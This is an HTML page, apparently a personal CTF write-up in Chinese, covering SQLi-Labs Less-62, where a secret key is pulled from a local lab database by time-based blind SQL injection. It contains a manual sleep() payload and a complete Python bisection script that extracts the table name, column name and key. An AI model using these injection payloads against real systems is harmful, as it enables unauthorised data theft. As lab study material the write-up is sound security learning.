@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-62 Challenge-9 时间盲注自动化 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-62 Challenge-9 时间盲注自动化 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-62 (Challenge-9)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为 <code>')</code>。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡彻底关闭了数据回显与错误提示，属于纯粹的盲注环境。</p>
+    <p><strong>技术选型：时间盲注（Time-based Blind SQLi）。</strong>利用 <code>if(条件, sleep(2), 0)</code> 制造响应时间差。为在 130 次限制内完成表名、列名及密钥的提取，采用 <b>二分法（Bisection）</b> 编写 Python 脚本进行自动化爆破。</p>
+
+    <h2>3. 操作步骤与代码解析</h2>
+    
+    <p><strong>第一步：手工验证延时通道</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1') and if(1=1,sleep(3),0)--+</code></p>
+    <p><strong>回显现象：</strong>页面卡顿约 3 秒，证明时间盲注通道有效。</p>
+
+    <p><strong>第二步：编写 Python 二分法自动化脚本</strong></p>
+    <p>在 VS Code 中编写脚本，核心逻辑在于计算 HTTP 请求的耗时差，并设定较高的判断阈值以过滤网络抖动。</p>
+
+    <pre><code>import requests
+import time
+
+url = "http://localhost/sqli-labs-master/Less-62/"
+# 阈值设高一点（1.5秒），防止网络波动误判
+delay_threshold = 1.5 
+
+def check_true(payload):
+    full_url = f"{url}?id=1') and ({payload})--+"
+    try:
+        start = time.time()
+        requests.get(full_url, timeout=10)
+        return (time.time() - start) &gt; delay_threshold
+    except requests.exceptions.Timeout:
+        return True
+
+def get_char(expr, pos):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        # 二分法核心：如果 ASCII 码大于中间值，就睡 2 秒
+        payload = f"if(ascii(substr({expr},{pos},1))&gt;{mid},sleep(2),0)"
+        if check_true(payload):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def extract(expr, length):
+    result = ""
+    for i in range(1, length + 1):
+        code = get_char(expr, i)
+        if code &lt;= 32 or code &gt; 126:
+            break
+        result += chr(code)
+        print(f"\r[*] 当前结果: {result}", end="", flush=True)
+    print()
+    return result
+
+if __name__ == "__main__":
+    print("[*] 开始 L62 时间盲注二分法提取...")
+    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
+    print(f"[+] 表名: {table}")
+    
+    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
+    print(f"[+] 列名: {col}")
+    
+    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
+    print(f"[+] 最终密钥: {secret}")</code></pre>
+
+    <p><strong>第三步：执行结果</strong></p>
+    <p>终端成功输出：表名 <code>3wgnd4kpm2</code>，列名 <code>secret_CTFP</code>，最终密钥 <code>npOJXohYGDdui9VFkoqw8SA</code>。将其提交至页面底部输入框，通关成功。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>网络延迟导致的误判（秒数编码法失败）：</strong>最初尝试使用 <code>sleep(ascii div 32)</code> 的秒数编码法，但因本地网络延迟（如 0.6 秒）被 <code>round()</code> 函数误判为 1 秒，导致爆出 <code>baiAdAsA</code> 等乱码。时间盲注对网络环境极其敏感。</li>
+        <li><strong>二分法阈值优化：</strong>改用二分法，强制 <code>sleep(2)</code>，并将耗时阈值设为 <code>1.5</code> 秒。只要耗时超过 1.5 秒即判定为真，有效过滤了网络抖动的干扰。</li>
+        <li><strong>边界条件终止：</strong>在提取函数中加入 <code>if code &lt;= 32 or code &gt; 126: break</code>，防止因空字符无限循环，提高脚本健壮性。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>时间盲注（Time-based Blind SQLi）</strong>：适用于无回显、无报错的环境。</li>
+        <li><strong>二分法（Bisection）</strong>：在盲注中通过不断折半缩小目标 ASCII 码的范围，极大提升效率。</li>
+        <li><strong>网络环境对盲注的影响</strong>：在网络延迟大的环境下，必须采用较高的延时阈值或更稳定的判断逻辑。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
